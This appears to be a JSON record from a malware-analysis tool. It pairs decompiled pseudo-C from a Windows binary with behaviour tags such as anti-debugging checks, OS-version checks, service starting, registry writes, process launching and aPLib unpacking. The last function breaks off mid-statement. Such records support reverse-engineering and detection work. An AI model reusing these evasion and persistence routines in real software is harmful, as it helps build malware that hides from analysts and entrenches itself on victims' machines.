{
    "00401030": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00401030(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    code *pcVar1;\n    uint arg_ch_00;\n    uint arg_ch_01;\n    uint arg_ch_02;\n    int32_t iVar2;\n    uint *puVar3;\n    uint var_314h;\n    uint var_210h;\n    uchar lpBuffer;\n    uint var_10bh;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_8h = 0;\n    lpBuffer = 0;\n    puVar3 = &var_10bh;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    *puVar3 = 0;\n    *(puVar3 + 2) = 0;\n    fcn.00404d40();\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)(&lpBuffer, 0x104);\n    var_4h = 0;\n    do {\n        arg_ch_00 = fcn.00401180();\n        arg_ch_01 = fcn.00401180();\n        arg_ch_02 = fcn.00401180();\n        fcn.00401d80(arg_10h, arg_ch_00);\n        fcn.00401d80(arg_8h, arg_ch_01);\n        fcn.00401d80(arg_ch, arg_ch_02);\n        pcVar1 = _sym.imp.MSVCRT.dll_sprintf;\n        (*_sym.imp.MSVCRT.dll_sprintf)(&var_314h, 0x411140, &lpBuffer, arg_10h);\n        iVar2 = fcn.004028b0(&var_314h);\n        if (iVar2 != 0) {\n            (*pcVar1)(&var_210h, 0x41114c, &lpBuffer, arg_8h);\n            iVar2 = fcn.004028b0(&var_210h);\n            if (iVar2 != 0) {\n                (*pcVar1)(&var_210h, 0x41114c, &lpBuffer, arg_ch);\n                iVar2 = fcn.004028b0(&var_210h);\n                if (iVar2 != 0) {\n                    iVar2 = 1;\n                    break;\n                }\n            }\n        }\n        var_4h = var_4h + 1;\n        iVar2 = var_8h;\n    } while (var_4h < 3);\n    fcn.00401d80(arg_14h, 4);\n    return iVar2 != 0;\n}\n",
        "token_count": 615
    },
    "0040461b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004047a3) overlaps instruction at (ram,0x004047a1)\n// \n// WARNING: Removing unreachable block (ram,0x0040475d)\n// WARNING: Removing unreachable block (ram,0x00404769)\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0040461b(void)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t unaff_EBP;\n    uint *puVar3;\n    bool bVar4;\n    ulong uVar5;\n    uint var_25fh;\n    uint var_15bh;\n    uint var_58h;\n    uint uStack56;\n    int32_t iStack52;\n    uint var_2ch;\n    uint var_28h;\n    uint uStack40;\n    int32_t iStack36;\n    uint uStack32;\n    int32_t iStack28;\n    int32_t var_14h;\n    int32_t hProcess;\n    uint var_ch;\n    int32_t lParam;\n    uint var_4h;\n    uchar uStack4;\n    uchar uStack3;\n    ushort uStack2;\n    \n    uStack4 = 0x2c;\n    uStack3 = 0x46;\n    uStack2 = 0x40;\n    var_4h._2_2_ = fcn.004039a0();\n    uStack4 = 0x46;\n    uStack3 = 0x46;\n    uStack2 = 0x40;\n    iVar2 = fcn.00403e00();\n    if (iVar2 != 0) {\n        *(unaff_EBP + -0x260) = 0;\n        uStack4 = 0;\n        uStack3 = 0;\n        uStack2 = 0;\n        puVar3 = unaff_EBP + -0x25f;\n        for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n            *puVar3 = 0;\n            puVar3 = puVar3 + 1;\n        }\n        *puVar3 = 0;\n        *(puVar3 + 2) = 0;\n        lParam = unaff_EBP + -0x260;\n        var_4h._0_2_ = 0x26;\n        var_4h._2_2_ = 0;\n        var_ch = 0;\n        hProcess = 0x40469b;\n        uVar5 = (*_sym.imp.SHELL32.dll_SHGetSpecialFolderPathA)();\n        iStack28 = uVar5 >> 0x20;\n        if (uVar5 != 0) {\n            hProcess = 0x4046d1;\n            fcn.00404d40();\n            *(unaff_EBP + -0x15c) = 0;\n            puVar3 = unaff_EBP + -0x15b;\n            for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n                *puVar3 = 0;\n                puVar3 = puVar3 + 1;\n            }\n            *puVar3 = 0;\n            *(puVar3 + 2) = 0;\n            hProcess = 3;\n            iStack28 = unaff_EBP + -0x260;\n            var_14h = 0x4114a8;\n            iStack36 = unaff_EBP + -0x15c;\n            uStack32 = 0x4114c8;\n            uStack40 = 0x404723;\n            (*_sym.imp.MSVCRT.dll_sprintf)();\n            *(unaff_EBP + -0x14) = 0;\n            do {\n                puVar3 = unaff_EBP + -0x58;\n                for (iVar2 = 0x11; iVar2 != 0; iVar2 = iVar2 + -1) {\n                    *puVar3 = 0;\n                    puVar3 = puVar3 + 1;\n                }\n                *(unaff_EBP + -0x10) = 0;\n                *(unaff_EBP + -0x58) = 0x44;\n                *(unaff_EBP + -0xc) = 0;\n                *(unaff_EBP + -0x2c) = 1;\n                *(unaff_EBP + -8) = 0;\n                *(unaff_EBP + -0x28) = 0;\n                *(unaff_EBP + -4) = 0;\n                hProcess = unaff_EBP + -0x10;\n                var_14h = unaff_EBP + -0x58;\n                iStack28 = 0;\n                uStack32 = 0;\n                iStack36 = 0;\n                uStack40 = 0;\n                var_28h = 0;\n                iStack52 = unaff_EBP + -0x15c;\n                var_2ch = 0;\n                uStack56 = 0;\n                iVar2 = (*_sym.imp.KERNEL32.dll_CreateProcessA)();\n                bVar4 = iVar2 == 0;\n                if (bVar4) {\n                    return;\n                }\n                if ((bVar4) || (!bVar4)) {\n                    (*_sym.imp.KERNEL32.dll_Sleep)();\n                }\n                else {\n                    puVar3[0x1a] = puVar3[0x1a] - &stack0xffffffc8;\n                }\n                (*_sym.imp.USER32.dll_EnumWindows)();\n                iVar2 = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(*(unaff_EBP + -0x10), 1000);\n                if (iVar2 == 0x102) {\n                    (*_sym.imp.KERNEL32.dll_TerminateProcess)(*(unaff_EBP + -0x10), 1);\n                }\n                pcVar1 = _sym.imp.KERNEL32.dll_CloseHandle;\n                (*_sym.imp.KERNEL32.dll_CloseHandle)(*(unaff_EBP + -0xc));\n                (*pcVar1)(*(unaff_EBP + -0x10));\n                iVar2 = *(unaff_EBP + -0x14) + 1;\n                *(unaff_EBP + -0x14) = iVar2;\n            } while (iVar2 < 3);\n        }\n    }\n    return;\n}\n",
        "token_count": 1398
    },
    "004013a0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.004013a0(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint var_130h;\n    uint var_12ch;\n    uint var_128h;\n    uint var_10ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_8h = 0xffffffff;\n    iVar1 = (**0x4225bc)();\n    if (iVar1 == -1) {\n        return 0xffffffff;\n    }\n    var_130h = 0x128;\n    puVar3 = &var_12ch;\n    var_4h = iVar1;\n    for (iVar2 = 0x49; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    iVar2 = (**0x4225c0)();\n    do {\n        if (iVar2 == 0) {\ncode_r0x00401465:\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar1);\n            return var_8h;\n        }\n        iVar1 = (*_sym.imp.MSVCRT.dll__stricmp)(&var_10ch, arg_8h);\n        if (iVar1 == 0) {\n            var_8h = var_128h;\n            iVar1 = var_4h;\n            goto code_r0x00401465;\n        }\n        iVar2 = (**0x4225c4)(var_4h, &var_130h);\n        iVar1 = var_4h;\n    } while( true );\n}\n",
        "token_count": 385
    },
    "004015d0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.004015d0(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, int32_t arg_20h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uchar var_10ch;\n    uint var_10bh;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.00402d40();\n    fcn.00402d40();\n    fcn.00402d40();\n    uVar1 = fcn.00402d40();\n    if ((&stack0xfffffed1 < 0xffffffec) && (&stack0xfffffed1 >= 0xffffffec)) {\n        out(0xbd, uVar1);\n        return;\n    }\n    iVar2 = func_0x00401580();\n    if (iVar2 == -1) {\n        iVar2 = (*_sym.imp.MSVCRT.dll_rand)();\n        *(arg_20h + 0x120) = iVar2 % 5;\n    }\n    else {\n        *(arg_20h + 0x120) = iVar2;\n    }\n    var_10ch = 0;\n    puVar3 = &var_10bh;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    *puVar3 = 0;\n    var_4h = 0x104;\n    *(puVar3 + 2) = 0;\n    iVar2 = fcn.00402e40(0x80000001, 0x411374, 0x4113a0, &var_8h, &var_10ch, &var_4h);\n    if ((iVar2 != 0) && (iVar2 = (*_sym.imp.MSVCRT.dll__stricmp)(),  iVar2 == 0)) {\n        *(arg_20h + 0x120) = *(arg_20h + 0x120) | 0x80;\n    }\n    return;\n}\n",
        "token_count": 491
    },
    "004017e0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint fcn.004017e0(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00402cf0(0x41112c);\n    if (iVar1 != -1) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar1);\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 76
    },
    "00401de0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401f39) overlaps instruction at (ram,0x00401f37)\n// \n\nuint __cdecl\nfcn.00401de0(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint8_t extraout_CL;\n    int32_t extraout_ECX;\n    int32_t unaff_EBX;\n    int32_t *unaff_EDI;\n    int32_t *piVar5;\n    uint16_t in_SS;\n    char in_AF;\n    bool bVar6;\n    ulong uVar7;\n    uint var_8h;\n    int32_t noname_2_00;\n    uint32_t noname_3_00;\n    uchar *noname_4_00;\n    uint noname_5_00;\n    uint arg_8h_00;\n    uint uStack44;\n    uchar *puStack40;\n    uint uStack36;\n    uint uStack32;\n    int32_t iStack28;\n    uint32_t uStack24;\n    uint32_t uStack20;\n    \n    uStack20 = 0x401dfa;\n    uVar7 = fcn.004013a0(0x411198);\n    iStack28 = uVar7;\n    if (iStack28 != -1) {\n        piVar5 = unaff_EDI;\n        if ((-2 < iStack28) && (iStack28 < -1)) {\n            out(0xc4, iStack28);\n            uStack24 = uVar7 >> 0x20 & 0xffffff00 | uVar7 >> 0x20 ^ extraout_CL;\n            uStack20 = uStack20 & 0xffff0000 | in_SS;\n            piVar5 = unaff_EDI + 1;\n            *unaff_EDI = iStack28;\n        }\n        uStack32 = 0;\n        uStack36 = 0x40;\n        puStack40 = 0x401e34;\n        iVar1 = (*_sym.imp.KERNEL32.dll_OpenProcess)();\n        bVar6 = iVar1 == 0;\n        if (bVar6) {\n            return 0;\n        }\n        if ((!bVar6) && (bVar6)) {\n            if (unaff_EBX + 1 == 0) {\n                puStack40 = &stack0xfffffffc;\n                *0x4225c8 = fcn.00404e00();\n                arg_8h_00 = uStack32;\n                iVar1 = (*_sym.imp.KERNEL32.dll_CreateFileA)();\n                if (iVar1 == -1) {\n                    return 0;\n                }\n                noname_4_00 = &stack0xffffffd4;\n                noname_5_00 = 0;\n                iVar4 = iVar1;\n                noname_2_00 = iStack28;\n                noname_3_00 = uStack24;\n                uVar2 = (*_sym.imp.KERNEL32.dll_WriteFile)();\n                bVar6 = uVar2 == 0;\n                if (bVar6) {\n                    return 0;\n                }\n                uVar3 = *0x4225c8;\n                if ((!bVar6) && (bVar6)) {\n                    *(piVar5 + -0x5f) = *(piVar5 + -0x5f) - &stack0xffffff9c;\n                    uVar3 = uVar2;\n                }\n                if (uVar3 != 0) {\n                    iVar4 = fcn.00401de0(iVar1, iVar4, noname_2_00, noname_3_00, noname_4_00, noname_5_00, arg_8h_00);\n                    *0x4225c8 = iVar4 == 0;\n                }\n                fcn.00402100(0, iVar1);\n                if (*0x4225c8 == 0) {\n                    (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar1);\n                }\n                return 1;\n            }\n            piVar5 = (CONCAT11(in_AF, in_AF * '\\x06') & 0xff0f) + 0x2a;\n            *piVar5 = *piVar5 - (unaff_EBX + 1);\n        }\n        puStack40 = 0x2;\n        uStack44 = 0;\n        (*_sym.imp.KERNEL32.dll_GetCurrentProcess)();\n        iVar1 = (*_sym.imp.KERNEL32.dll_DuplicateHandle)();\n        if (iVar1 == 0) {\n            return 0;\n        }\n        if ((iVar1 < 1) || (0 < iVar1)) {\n            (*_sym.imp.KERNEL32.dll_CloseHandle)();\n            return 1;\n        }\n        if (extraout_ECX != 0) {\n            do {\n    // WARNING: Do nothing block with infinite loop\n            } while( true );\n        }\n    }\n    return 0;\n}\n",
        "token_count": 1128
    },
    "00401ea0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1",
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401f39) overlaps instruction at (ram,0x00401f37)\n// \n\nuint __cdecl fcn.00401ea0(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t noname_0;\n    uint32_t uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t unaff_EDI;\n    bool bVar4;\n    uint *noname_4;\n    uint noname_5;\n    uint var_4h;\n    \n    *0x4225c8 = fcn.00404e00();\n    noname_0 = (*_sym.imp.KERNEL32.dll_CreateFileA)();\n    if (noname_0 == -1) {\n        return 0;\n    }\n    noname_4 = &var_4h;\n    noname_5 = 0;\n    iVar3 = noname_0;\n    uVar1 = (*_sym.imp.KERNEL32.dll_WriteFile)();\n    bVar4 = uVar1 != 0;\n    if (bVar4) {\n        uVar2 = *0x4225c8;\n        if ((bVar4) && (!bVar4)) {\n            *(unaff_EDI + -0x5f) = *(unaff_EDI + -0x5f) - &stack0xffffffc0;\n            uVar2 = uVar1;\n        }\n        if (uVar2 != 0) {\n            iVar3 = fcn.00401de0(noname_0, iVar3, arg_ch, arg_10h, noname_4, noname_5, arg_8h);\n            *0x4225c8 = iVar3 == 0;\n        }\n        fcn.00402100(0, noname_0);\n        if (*0x4225c8 == 0) {\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(noname_0);\n        }\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 451
    },
    "00402300": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1",
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1",
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402373) overlaps instruction at (ram,0x00402370)\n// \n// WARNING: Control flow encountered bad instruction data\n// WARNING: Removing unreachable block (ram,0x00402439)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuchar * __cdecl fcn.00402300(char *arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    int32_t extraout_ECX;\n    ushort extraout_DX;\n    ushort uVar2;\n    uint unaff_ESI;\n    uchar *puVar3;\n    uchar *puVar4;\n    uint unaff_EDI;\n    uint *puVar5;\n    char *pcVar6;\n    uint16_t in_ES;\n    bool bVar7;\n    unkbyte6 Var8;\n    uint noname_3;\n    uchar lpBuffer;\n    uint var_213h;\n    uchar s;\n    uint var_10fh;\n    uint32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    lpBuffer = 0;\n    puVar5 = &var_213h;\n    for (iVar1 = 0x40; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    s = 0;\n    puVar5 = &var_10fh;\n    for (iVar1 = 0x40; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    var_ch = 1;\n    *(puVar5 + 2) = 0;\n    puVar4 = &lpBuffer;\n    noname_3 = 0x104;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)();\n    (*_sym.imp.MSVCRT.dll_sprintf)();\n    fcn.00401320(&var_4h, &var_8h);\n    iVar1 = fcn.00401fb0(arg_8h, arg_ch, arg_10h, arg_14h, var_4h, var_8h);\n    if (iVar1 == 0) {\n        return NULL;\n    }\n    if ((0 < iVar1) && (iVar1 < 1)) {\n        if (extraout_ECX == 0) {\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n        do {\n    // WARNING: Do nothing block with infinite loop\n        } while( true );\n    }\n    iVar1 = fcn.00401ea0(&s, var_4h, var_8h);\n    bVar7 = iVar1 == 0;\n    if (bVar7) {\n        return NULL;\n    }\n    if ((-1 < iVar1) && (-1 >= iVar1)) {\n        puVar4 = puVar4 & 0xffff0000 | in_ES;\n        pcVar6 = arg_8h | &stack0xfffffffc;\n        arg_8h = pcVar6 + 1;\n        *pcVar6 = iVar1;\n        bVar7 = iVar1 + (iVar1 >> 8) * 'y' == '\\0';\n    }\n    if ((!bVar7) && (bVar7)) {\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    fcn.00402bd0();\n    iVar1 = fcn.004013a0(0x411184);\n    if ((iVar1 != -1) || (iVar1 = fcn.004013a0(0x411178),  iVar1 != -1)) {\n        iVar1 = fcn.00401000(arg_8h);\n        if (iVar1 != 0) {\n            fcn.00402670();\n            fcn.00402e30();\n            return 0x1;\n        }\n        if (*0x4225c8 == 0) {\n            return NULL;\n        }\n    }\n    Var8 = fcn.00401c60(arg_8h, &s, puVar4, noname_3, unaff_EDI, unaff_ESI);\n    uVar2 = Var8 >> 0x20;\n    puVar4 = var_ch;\n    if (Var8 == 0) {\n        puVar4 = 0;\n    }\n    if (puVar4 != NULL) {\n        Var8 = fcn.00401c00(arg_8h);\n        uVar2 = Var8 >> 0x20;\n        if (Var8 == 0) {\n            var_ch = 0;\n            puVar4 = Var8;\n        }\n    }\n    Var8 = CONCAT24(uVar2, puVar4);\n    if (puVar4 == NULL) {\n        Var8 = fcn.00403c40(arg_8h, 0);\n        var_ch = Var8;\n        puVar4 = &stack0xfffffdd4;\n    }\n    uVar2 = Var8 >> 0x20;\n    puVar3 = Var8;\n    bVar7 = (POPCOUNT(puVar4 & 0xff) & 1U) != 0;\n    if (((bVar7) && (!bVar7)) || (bVar7 = puVar3 == NULL,  !bVar7)) {\n        fcn.00402e30();\n        bVar7 = *0x10 == 0x22c;\n        uVar2 = extraout_DX;\n    }\n    puVar4 = puVar3;\n    if ((!bVar7) && (bVar7)) {\n        puVar4 = puVar3 + 1;\n        out(*puVar3, uVar2);\n    }\n    (*_sym.imp.KERNEL32.dll_Sleep)();\n    (*_sym.imp.KERNEL32.dll_WinExec)();\n    return puVar4;\n}\n",
        "token_count": 1348
    },
    "004028b0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004028b0(uint arg_8h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.MSVCRT.dll__access)(arg_8h, 0);\n    if (iVar1 != -1) {\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 73
    },
    "null": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "",
        "token_count": 0
    },
    "00401d00": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401d37) overlaps instruction at (ram,0x00401d32)\n// \n\nulong fcn.00401d00(void)\n\n{\n    char *pcVar1;\n    char extraout_CL;\n    int32_t iVar2;\n    int32_t unaff_EBX;\n    bool bVar3;\n    ulong uVar4;\n    uint lpVersionInformation;\n    int32_t var_90h;\n    uint var_8ch;\n    \n    bVar3 = (POPCOUNT(&lpVersionInformation & 0xff) & 1U) == 0;\n    lpVersionInformation = 0x94;\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetVersionExA)(&lpVersionInformation);\n    iVar2 = uVar4 >> 0x20;\n    if (((bVar3) || (!bVar3)) && (var_90h == 5)) {\n        return CONCAT44(iVar2, 1);\n    }\n    pcVar1 = iVar2 + 0x1b80976;\n    *pcVar1 = *pcVar1 + pcVar1;\n    *(unaff_EBX + 0x51c35de5) = *(unaff_EBX + 0x51c35de5) + extraout_CL;\n    if ((*0xfffffee0 == 6) && (*0xfffffee4 == 0)) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 319
    },
    "00402a30": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402a4e) overlaps instruction at (ram,0x00402a4d)\n// \n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.00402a30(uint arg_8h, uint arg_ch)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    char extraout_DL;\n    int32_t unaff_EBX;\n    int32_t unaff_EDI;\n    \n    iVar2 = func_0x101889c0();\n    *(iVar2 + -1) = *(iVar2 + -1) | unaff_EBX + 0x4d8b0c45 >> 8;\n    *(unaff_EDI + 1) = *(unaff_EDI + 1) + unaff_EBX + 0x4d8b0c45;\n    *(iVar2 + 0x51) = *(iVar2 + 0x51) + extraout_DL;\n    iVar2 = (*_sym.imp.ADVAPI32.dll_OpenServiceA)();\n    if (iVar2 == 0) {\n        return 0;\n    }\n    iVar3 = (*_sym.imp.ADVAPI32.dll_StartServiceA)(iVar2, 0, 0);\n    pcVar1 = _sym.imp.KERNEL32.dll_GetLastError;\n    if (((iVar3 == 0) && (iVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)(),  iVar3 != 0x420)) &&\n       (iVar3 = (*pcVar1)(),  iVar3 != 0x422)) {\n        (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar2);\n        return 0;\n    }\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar2);\n    return 1;\n}\n",
        "token_count": 405
    },
    "00403c40": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.00403c40(char *arg_8h, int32_t arg_ch)\n\n{\n    char cVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint *puVar5;\n    char *pcVar6;\n    uchar var_268h;\n    uint var_267h;\n    char var_164h;\n    uint var_163h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    char *var_4ch;\n    char *var_48h;\n    uint *var_44h;\n    uint *var_40h;\n    uint *var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    int32_t var_24h;\n    int32_t var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    pcVar2 = _sym.imp.MSVCRT.dll_sprintf;\n    var_268h = 0;\n    puVar5 = &var_267h;\n    for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    var_164h = '\\0';\n    puVar5 = &var_163h;\n    for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    var_8h = 1;\n    var_4h = 0;\n    var_ch = 1;\n    var_10h = arg_ch != 0;\n    (*_sym.imp.MSVCRT.dll_sprintf)(&var_164h, 0x4111a8, arg_8h);\n    (*pcVar2)(&var_268h, 0x4111c0, arg_8h);\n    pcVar2 = _sym.imp.SHLWAPI.dll_SHSetValueA;\n    var_44h = &var_8h;\n    var_40h = &var_4h;\n    uVar4 = 0xffffffff;\n    pcVar6 = &var_164h;\n    do {\n        if (uVar4 == 0) break;\n        uVar4 = uVar4 - 1;\n        cVar1 = *pcVar6;\n        pcVar6 = pcVar6 + 1;\n    } while (cVar1 != '\\0');\n    var_24h = ~uVar4 - 1;\n    uVar4 = 0xffffffff;\n    pcVar6 = arg_8h;\n    do {\n        if (uVar4 == 0) break;\n        uVar4 = uVar4 - 1;\n        cVar1 = *pcVar6;\n        pcVar6 = pcVar6 + 1;\n    } while (cVar1 != '\\0');\n    var_4ch = &var_164h;\n    var_38h = 0x4111e8;\n    var_34h = 0x4111f4;\n    var_30h = 0x411200;\n    var_2ch = 0x411210;\n    var_28h = 0x411218;\n    var_60h = 2;\n    var_5ch = 1;\n    var_58h = 4;\n    var_54h = 4;\n    var_50h = 4;\n    var_48h = arg_8h;\n    var_3ch = &var_ch;\n    var_20h = ~uVar4 - 1;\n    var_1ch = 4;\n    var_18h = 4;\n    var_14h = 4;\n    if (var_10h < 5) {\n        uVar4 = var_10h * 4;\n        do {\n            iVar3 = (*pcVar2)(0x80000002, &var_268h, *(&var_38h + uVar4), *(&var_60h + uVar4), *(&var_4ch + uVar4), \n                              *(&var_24h + uVar4));\n            if (iVar3 != 0) {\n                return 0;\n            }\n            uVar4 = uVar4 + 4;\n        } while (uVar4 < 0x14);\n    }\n    return 1;\n}\n",
        "token_count": 1124
    },
    "00403ee0": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nbool __cdecl fcn.00403ee0(uint s1)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint32_t uVar3;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    (*_sym.imp.MSVCRT.dll__strlwr)(s1);\n    var_14h = 0x41155c;\n    var_10h = 0x411554;\n    var_ch = 0x411564;\n    var_8h = 0x41156c;\n    var_4h = 0x411574;\n    uVar3 = 0;\n    puVar2 = &var_14h;\n    do {\n        iVar1 = (*_sym.imp.MSVCRT.dll_strstr)(s1, *puVar2);\n        if (iVar1 != 0) {\n            return true;\n        }\n        uVar3 = uVar3 + 1;\n        puVar2 = puVar2 + 1;\n    } while (uVar3 < 5);\n    iVar1 = (*_sym.imp.MSVCRT.dll_strstr)(s1, 0x41154c);\n    return iVar1 == 0;\n}\n",
        "token_count": 297
    },
    "00401a20": {
        "rules": [
            "decompress data using aPLib/db7317f0dd944ab688d24dced6f5a7c2"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401a78) overlaps instruction at (ram,0x00401a77)\n// \n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nchar * __cdecl fcn.00401a20(uint16_t *arg_8h)\n\n{\n    char *pcVar1;\n    uint16_t uVar2;\n    char unaff_00023900;\n    uchar *unaff_00023b00;\n    char cVar3;\n    char *pcVar4;\n    uint *puVar5;\n    int32_t iVar6;\n    int32_t *in_ECX;\n    uint32_t uVar7;\n    ushort in_DX;\n    uint32_t unaff_EBX;\n    uint *unaff_ESI;\n    int32_t *piVar8;\n    int32_t *piVar9;\n    char *unaff_EDI;\n    int32_t *piVar10;\n    uint *puVar11;\n    bool bVar12;\n    uint auStack36379 [9081];\n    uint uStack32;\n    int32_t *var_4h;\n    \n    puVar5 = &stack0xfffffffc;\n    uVar2 = *arg_8h;\n    if (*arg_8h != 0x5a4d) {\n        return NULL;\n    }\n    if ((SBORROW2(*arg_8h, 0x5a4d)) || (!SBORROW2(*arg_8h, 0x5a4d))) {\n        bVar12 = SCARRY4(*(arg_8h + 0x1e), arg_8h);\n        in_ECX = *(arg_8h + 0x1e) + arg_8h;\n        if ((in_ECX == NULL || bVar12 != in_ECX < 0) || (in_ECX != NULL && bVar12 == in_ECX < 0)) {\n            bVar12 = *in_ECX == 0x4550;\n        }\n        else {\n            *(arg_8h + -0x3f6312d5) = *(arg_8h + -0x3f6312d5) ^ in_ECX;\n            *arg_8h = *arg_8h + arg_8h;\n            bVar12 = *arg_8h == '\\0';\n        }\n        if (bVar12) {\n            if (in_ECX[0x16] != 0) {\n                return NULL;\n            }\n            var_4h = 0x40;\n            goto 